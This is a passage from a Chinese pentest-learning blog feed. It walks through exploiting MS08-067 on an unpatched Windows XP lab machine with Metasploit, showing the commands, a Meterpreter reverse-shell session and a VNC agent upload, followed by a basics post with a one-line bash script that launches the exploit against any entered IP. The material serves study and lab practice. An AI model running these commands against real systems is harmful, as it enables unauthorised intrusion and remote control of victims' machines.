XP没更新也没开启防火墙所以可以利用MS08-067发起攻击 3.利用Metasploit的渗透攻击模块进行攻击 3.1.搜寻并加载模块 12345678910111213141516171819202122232425msf5 &gt; search ms08-067Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms08_067_netapi 2008-10-28 great Yes MS08-067 Microsoft Server Service Relative Path Stack Corruptionmsf5 &gt; use exploit/windows/smb/ms08_067_netapimsf5 exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Exploit target: Id Name -- ---- 0 Automatic Targeting 3.2.设置必要的信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899msf5 exploit(windows/smb/ms08_067_netapi) &gt; set RHOSTS 10.10.10.131RHOSTS =&gt; 10.10.10.131msf5 exploit(windows/smb/ms08_067_netapi) &gt; show targetsExploit targets: Id Name -- ---- 0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal 3 Windows 2003 SP0 Universal 4 Windows XP SP2 English (AlwaysOn NX) 5 Windows XP SP2 English (NX) 6 Windows XP SP3 English (AlwaysOn NX) 7 Windows XP SP3 English (NX) 8 Windows XP SP2 Arabic (NX) 9 Windows XP SP2 Chinese - Traditional / Taiwan (NX) 10 Windows XP SP2 Chinese - Simplified (NX) 11 Windows XP SP2 Chinese - Traditional (NX) 12 Windows XP SP2 Czech (NX) 13 Windows XP SP2 Danish (NX) 14 Windows XP SP2 German (NX) 15 Windows XP SP2 Greek (NX) 16 Windows XP SP2 Spanish (NX) 17 Windows XP SP2 Finnish (NX) 18 Windows XP SP2 French (NX) 19 Windows XP SP2 Hebrew (NX) 20 Windows XP SP2 Hungarian (NX) 21 Windows XP SP2 Italian (NX) 22 Windows XP SP2 Japanese (NX) 23 Windows XP SP2 Korean (NX) 24 Windows XP SP2 Dutch (NX) 25 Windows XP SP2 Norwegian (NX) 26 Windows XP SP2 Polish (NX) 27 Windows XP SP2 Portuguese - Brazilian (NX) 28 Windows XP SP2 Portuguese (NX) 29 Windows XP SP2 Russian (NX) 30 Windows XP SP2 Swedish (NX) 31 Windows XP SP2 Turkish (NX) 32 Windows XP SP3 Arabic (NX) 33 Windows XP SP3 Chinese - Traditional / Taiwan (NX) 34 Windows XP SP3 Chinese - Simplified (NX) 35 Windows XP SP3 Chinese - Traditional (NX) 36 Windows XP SP3 Czech (NX) 37 Windows XP SP3 Danish (NX) 38 Windows XP SP3 German (NX) 39 Windows XP SP3 Greek (NX) 40 Windows XP SP3 Spanish (NX) 41 Windows XP SP3 Finnish (NX) 42 Windows XP SP3 French (NX) 43 Windows XP SP3 Hebrew (NX) 44 Windows XP SP3 Hungarian (NX) 45 Windows XP SP3 Italian (NX) 46 Windows XP SP3 Japanese (NX) 47 Windows XP SP3 Korean (NX) 48 Windows XP SP3 Dutch (NX) 49 Windows XP SP3 Norwegian (NX) 50 Windows XP SP3 Polish (NX) 51 Windows XP SP3 Portuguese - Brazilian (NX) 52 Windows XP SP3 Portuguese (NX) 53 Windows XP SP3 Russian (NX) 54 Windows XP SP3 Swedish (NX) 55 Windows XP SP3 Turkish (NX) 56 Windows 2003 SP1 English (NO NX) 57 Windows 2003 SP1 English (NX) 58 Windows 2003 SP1 Japanese (NO NX) 59 Windows 2003 SP1 Spanish (NO NX) 60 Windows 2003 SP1 Spanish (NX) 61 Windows 2003 SP1 French (NO NX) 62 Windows 2003 SP1 French (NX) 63 Windows 2003 SP2 English (NO NX) 64 Windows 2003 SP2 English (NX) 65 Windows 2003 SP2 German (NO NX) 66 Windows 2003 SP2 German (NX) 67 Windows 2003 SP2 Portuguese - Brazilian (NX) 68 Windows 2003 SP2 Spanish (NO NX) 69 Windows 2003 SP2 Spanish (NX) 70 Windows 2003 SP2 Japanese (NO NX) 71 Windows 2003 SP2 French (NO NX) 72 Windows 2003 SP2 French (NX)msf5 exploit(windows/smb/ms08_067_netapi) &gt; set target 10target =&gt; 10msf5 exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.131 yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Exploit target: Id Name -- ---- 10 Windows XP SP2 Chinese - Simplified (NX) 3.3.发起攻击 1234567msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit[*] Started reverse TCP handler on 10.10.10.128:4444 [*] 10.10.10.131:445 - Attempting to trigger the vulnerability...[*] Sending stage (179779 bytes) to 10.10.10.131[*] Meterpreter session 1 opened (10.10.10.128:4444 -&gt; 10.10.10.131:1046) at 2019-08-04 14:23:41 +0800 3.4.攻击载荷模块 1234567891011121314151617181920212223242526272829meterpreter &gt; ipconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 2============Name : AMD PCNET Family PCI Ethernet Adapter - rfaceHardware MAC : 00:0c:29:85:ca:88MTU : 1500IPv4 Address : 10.10.10.131IPv4 Netmask : 255.255.255.0Interface 65540============Name : Bluetooth @�Hardware MAC : c8:21:58:95:b0:86MTU : 1500meterpreter &gt; run vnc[*] Creating a VNC reverse tcp stager: LHOST=10.10.10.128 LPORT=4545[*] Running payload handler[*] VNC stager executable 73802 bytes long[*] Uploaded the VNC agent to C:\WINDOWS\TEMP\jOcidjq.exe (must be deleted manually)[*] Executing the VNC agent with endpoint 10.10.10.128:4545...]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>实战演习</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]1.了解渗透测试]]></title>
    <url>%2F2019%2F08%2F03%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-1-%E4%BA%86%E8%A7%A3%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[渗透和Metasploit的基本知识 一.初识渗透 1.渗透基本知识 1.1.渗透分类 黑盒测试 白盒测试 灰盒测试 1.2.渗透测试方法 OSSTMM NIST OWASP WASC-TC PTES 1.3.渗透测试过程 前期交互阶段 情报搜集阶段 威胁建模阶段 漏洞分析阶段 渗透攻击阶段 后渗透攻击阶段 2.漏洞基本知识 2.1.漏洞生命周期 2.2.漏洞披露方式 完全公开披露 负责任的公开披露 地下经济链 小范围利用直至被披露 2.3.漏洞公共资源库 Exploit-db VULHUB 3.Metasploit 包括了: 辅助模块 渗透攻击模块 攻击载荷模块 空指令模块 编码器模块 3.1.安装Metasploit Kali自带Metasploit msfgui msfconsole msfcli(命令行程序) 用msfconsole -x代替 示例: 123456789echo &quot;请输入目标IP&quot;read ipmsfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;set RHOST $ip;set target 10;exploit&quot; 参考书籍:Metasploit渗透测试魔鬼训练营]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>学习</tag>
      </tags>
  </entry>
</search>
